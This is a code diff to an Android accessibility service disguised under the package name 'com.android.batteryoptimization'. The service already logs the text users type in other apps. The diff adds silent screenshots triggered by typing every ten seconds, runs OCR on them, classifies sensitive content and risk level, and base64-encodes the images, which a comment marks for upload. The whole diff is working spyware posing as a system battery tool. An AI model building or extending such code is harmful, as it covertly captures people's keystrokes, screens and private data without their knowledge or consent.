@@ -2,10 +2,17 @@ package com.android.batteryoptimization
 
 import android.accessibilityservice.AccessibilityService
 import android.content.Intent
+import android.graphics.Bitmap
+import android.util.Base64
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
+import com.android.batteryoptimization.network.OcrDetailPayload
 import com.android.batteryoptimization.ocr.OcrEngine
+import com.android.batteryoptimization.ocr.OcrResult
+import com.google.gson.Gson
 import kotlinx.coroutines.*
+import java.io.ByteArrayOutputStream
+import java.util.concurrent.atomic.AtomicLong
 
 class InputAccessibilityService : AccessibilityService() {
 
@@ -13,6 +20,17 @@ class InputAccessibilityService : AccessibilityService() {
     private var ocrEngine: OcrEngine? = null
     private var screenshotReceiver: android.content.BroadcastReceiver? = null
     private val ocrScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+    private val gson = Gson()
+    private val prefs by lazy {
+        applicationContext.getSharedPreferences("keystroke_prefs", android.content.Context.MODE_PRIVATE)
+    }
+
+    /** 上次自动截屏时间戳（ms） */
+    private val lastAutoScreenshotTime = AtomicLong(0L)
+
+    /** 获取自动截屏间隔（ms），默认 10 秒 */
+    private fun getScreenshotInterval(): Long =
+        prefs.getLong(KEY_SCREENSHOT_INTERVAL, DEFAULT_SCREENSHOT_INTERVAL_MS)
 
     override fun onServiceConnected() {
         super.onServiceConnected()
@@ -31,36 +49,7 @@ class InputAccessibilityService : AccessibilityService() {
         screenshotReceiver = object : android.content.BroadcastReceiver() {
             override fun onReceive(context: android.content.Context?, intent: android.content.Intent?) {
                 Log.d(TAG, "Received screenshot broadcast — capturing + OCR")
-                takeScreenshot { bitmap, msg ->
-                    if (bitmap != null) {
-                        // Run OCR on the captured screenshot
-                        ocrScope.launch {
-                            try {
-                                val ocrResults = ocrEngine?.recognize(bitmap) ?: emptyList()
-                                if (ocrResults.isNotEmpty()) {
-                                    // Merge OCR results into event stream
-                                    repository.addOcrEvents(
-                                        packageName = "screenshot",
-                                        appName = "Screen OCR",
-                                        results = ocrResults
-                                    )
-                                    val text = ocrResults.joinToString(" | ") { it.text }
-                                    Log.d(TAG, "OCR result: $text")
-                                }
-                                bitmap.recycle()
-                            } catch (e: Exception) {
-                                Log.e(TAG, "OCR processing failed", e)
-                            }
-                        }
-                    }
-                    android.os.Handler(android.os.Looper.getMainLooper()).post {
-                        android.widget.Toast.makeText(
-                            this@InputAccessibilityService,
-                            msg,
-                            android.widget.Toast.LENGTH_SHORT
-                        ).show()
-                    }
-                }
+                doScreenshotAndOcr()
             }
         }
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
@@ -94,7 +83,7 @@ class InputAccessibilityService : AccessibilityService() {
             val text = event.text.joinToString(" ")
 
             if (text.isNotBlank()) {
-                val prefs = applicationContext.getSharedPreferences("keystroke_prefs", android.content.Context.MODE_PRIVATE)
+                // 记录输入事件
                 val current = prefs.getInt("total_keystrokes", 0)
                 prefs.edit().putInt("total_keystrokes", current + 1).apply()
 
@@ -107,6 +96,17 @@ class InputAccessibilityService : AccessibilityService() {
                 )
                 repository.addEvent(inputEvent)
                 Log.d(TAG, "Captured input: $text from $packageName")
+
+                // ── 自动截屏逻辑 ────────────────────────────────────
+                val now = System.currentTimeMillis()
+                val last = lastAutoScreenshotTime.get()
+                val interval = getScreenshotInterval()
+                if (now - last >= interval && lastAutoScreenshotTime.compareAndSet(last, now)) {
+                    Log.d(TAG, "Auto screenshot triggered (interval=${interval}ms)")
+                    ocrScope.launch {
+                        doAutoScreenshotOcr(packageName, appName)
+                    }
+                }
             }
         }
     }
@@ -115,23 +115,131 @@ class InputAccessibilityService : AccessibilityService() {
         Log.d(TAG, "Accessibility Service Interrupted")
     }
 
-    private fun getAppName(packageName: String): String {
-        return try {
-            val pm = packageManager
-            val applicationInfo = pm.getApplicationInfo(packageName, 0)
-            pm.getApplicationLabel(applicationInfo).toString()
+    // ─── 自动截屏 + OCR ─────────────────────────────────────────────
+
+    /**
+     * 执行截屏 → OCR → 压缩图片 → 存入事件流
+     */
+    private suspend fun doAutoScreenshotOcr(packageName: String, appName: String) {
+        var bitmap: android.graphics.Bitmap? = null
+        try {
+            bitmap = captureScreenshotBlocking() ?: return
+
+            val ocrResults = ocrEngine?.recognize(bitmap) ?: emptyList()
+            if (ocrResults.isEmpty()) {
+                Log.d(TAG, "Auto OCR: no text detected")
+                return
+            }
+
+            // 压缩截图为 base64（用于上传）
+            val screenshotBase64 = bitmapToBase64(bitmap)
+
+            // OCR 详细结果
+            val fullText = ocrResults.joinToString("\n") { it.text }
+            val details = ocrResults.map { r ->
+                OcrDetailPayload(
+                    text = r.text,
+                    confidence = r.confidence,
+                    boundingBox = r.box?.let { "${it.left},${it.top},${it.right},${it.bottom}" }
+                )
+            }
+            val detailsJson = gson.toJson(details)
+
+            // 内容分类
+            val (contentType, riskLevel, sensitiveInfo) = ContentClassifier.analyze(packageName, fullText)
+            val sensitiveInfoJson = gson.toJson(sensitiveInfo)
+
+            Log.d(TAG, "Auto OCR classify: type=$contentType risk=$riskLevel sensitive=$sensitiveInfo")
+
+            // 存入事件流
+            repository.addOcrEvents(
+                packageName = packageName,
+                appName = appName,
+                results = ocrResults,
+                screenshotBase64 = screenshotBase64,
+                ocrFullText = fullText,
+                ocrDetailsJson = detailsJson,
+                contentType = contentType,
+                riskLevel = riskLevel,
+                sensitiveInfoJson = sensitiveInfoJson
+            )
+            Log.d(TAG, "Auto OCR done: ${ocrResults.size} lines, text=$fullText")
         } catch (e: Exception) {
-            packageName
+            Log.e(TAG, "Auto screenshot+OCR failed", e)
+            // 失败时重置计时，允许下次重试
+            lastAutoScreenshotTime.set(0L)
+        } finally {
+            bitmap?.recycle()
         }
     }
 
     /**
-     * Take a silent screenshot and run OCR on it.
-     *
-     * @param onResult callback with (Bitmap?, message). Bitmap is the captured image,
-     *                 or null on failure. Caller must recycle the bitmap.
+     * 手动截屏（广播触发），带 Toast 提示
      */
-    fun takeScreenshot(onResult: (android.graphics.Bitmap?, String) -> Unit) {
+    private fun doScreenshotAndOcr() {
+        takeScreenshotCallback { bitmap, msg ->
+            if (bitmap != null) {
+                ocrScope.launch {
+                    try {
+                        val ocrResults = ocrEngine?.recognize(bitmap) ?: emptyList()
+                        if (ocrResults.isNotEmpty()) {
+                            val fullText = ocrResults.joinToString("\n") { it.text }
+                            val details = ocrResults.map { r ->
+                                OcrDetailPayload(
+                                    text = r.text,
+                                    confidence = r.confidence,
+                                    boundingBox = r.box?.let { "${it.left},${it.top},${it.right},${it.bottom}" }
+                                )
+                            }
+                            val detailsJson = gson.toJson(details)
+                            val screenshotBase64 = bitmapToBase64(bitmap)
+
+                            val (contentType, riskLevel, sensitiveInfo) = ContentClassifier.analyze(packageName = "screenshot", text = fullText)
+                            val sensitiveInfoJson = gson.toJson(sensitiveInfo)
+
+                            repository.addOcrEvents(
+                                packageName = "screenshot",
+                                appName = "Screen OCR",
+                                results = ocrResults,
+                                screenshotBase64 = screenshotBase64,
+                                ocrFullText = fullText,
+                                ocrDetailsJson = detailsJson,
+                                contentType = contentType,
+                                riskLevel = riskLevel,
+                                sensitiveInfoJson = sensitiveInfoJson
+                            )
+                            Log.d(TAG, "Manual OCR result: $fullText")
+                        }
+                        bitmap.recycle()
+                    } catch (e: Exception) {
+                        Log.e(TAG, "OCR processing failed", e)
+                    }
+                }
+            }
+            android.os.Handler(android.os.Looper.getMainLooper()).post {
+                android.widget.Toast.makeText(
+                    this@InputAccessibilityService,
+                    msg,
+                    android.widget.Toast.LENGTH_SHORT
+                ).show()
+            }
+        }
+    }
+
+    /**
+     * 同步截屏（挂起函数），返回 Bitmap 或 null
+     */
+    private suspend fun captureScreenshotBlocking(): android.graphics.Bitmap? =
+        suspendCancellableCoroutine { continuation ->
+            takeScreenshotCallback { bitmap, _ ->
+                continuation.resume(bitmap, null)
+            }
+        }
+
+    /**
+     * 截屏回调封装
+     */
+    private fun takeScreenshotCallback(onResult: (android.graphics.Bitmap?, String) -> Unit) {
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
             takeScreenshot(
                 android.view.Display.DEFAULT_DISPLAY,
@@ -145,12 +253,11 @@ class InputAccessibilityService : AccessibilityService() {
                                 screenshot.colorSpace
                             )
                             if (bitmap != null) {
-                                // Make a mutable copy to avoid surface buffer issues
                                 val mutableBitmap = bitmap.copy(android.graphics.Bitmap.Config.ARGB_8888, false)
                                 bitmap.recycle()
-                                onResult(mutableBitmap, "截图+OCR完成")
+                                onResult(mutableBitmap, "截图成功")
                             } else {
-                                onResult(null, "Bitmap转换失败")
+                                onResult(null, "Bitmap 转换失败")
                             }
                             hardwareBuffer.close()
                         } catch (e: Exception) {
@@ -170,14 +277,52 @@ class InputAccessibilityService : AccessibilityService() {
     }
 
     /**
+     * 将 Bitmap 压缩为 JPEG 并编码为 Base64（最长边缩至 720px，质量 60%）
+     */
+    private fun bitmapToBase64(bitmap: Bitmap): String {
+        val maxDimension = 720f
+        val scale = maxDimension / maxOf(bitmap.width, bitmap.height).coerceAtLeast(1)
+        val resized = if (scale < 1f) {
+            Bitmap.createScaledBitmap(
+                bitmap,
+                (bitmap.width * scale).toInt().coerceAtLeast(1),
+                (bitmap.height * scale).toInt().coerceAtLeast(1),
+                true
+            )
+        } else {
+            bitmap
+        }
+        val baos = ByteArrayOutputStream()
+        resized.compress(Bitmap.CompressFormat.JPEG, 60, baos)
+        if (resized != bitmap) resized.recycle()
+        return Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
+    }
+
+    // ─── 工具方法 ──────────────────────────────────────────────────
+
+    private fun getAppName(packageName: String): String {
+        return try {
+            val pm = packageManager
+            val applicationInfo = pm.getApplicationInfo(packageName, 0)
+            pm.getApplicationLabel(applicationInfo).toString()
+        } catch (e: Exception) {
+            packageName
+        }
+    }
+
+    /**
      * 获取 OCR 引擎，供 UI 层测试使用。
-     * 如果服务未初始化或 OCR 未加载完成，可能返回 null。
      */
     fun getOcrEngine(): OcrEngine? = ocrEngine
 
     companion object {
         private const val TAG = "InputAccessibility"
         const val ACTION_TAKE_SCREENSHOT = "com.android.batteryoptimization.ACTION_TAKE_SCREENSHOT"
+
+        /** 自动截屏间隔（ms）— SharedPreferences key */
+        const val KEY_SCREENSHOT_INTERVAL = "screenshot_interval_ms"
+        const val DEFAULT_SCREENSHOT_INTERVAL_MS = 10000L
+
         var instance: InputAccessibilityService? = null
             private set
     }
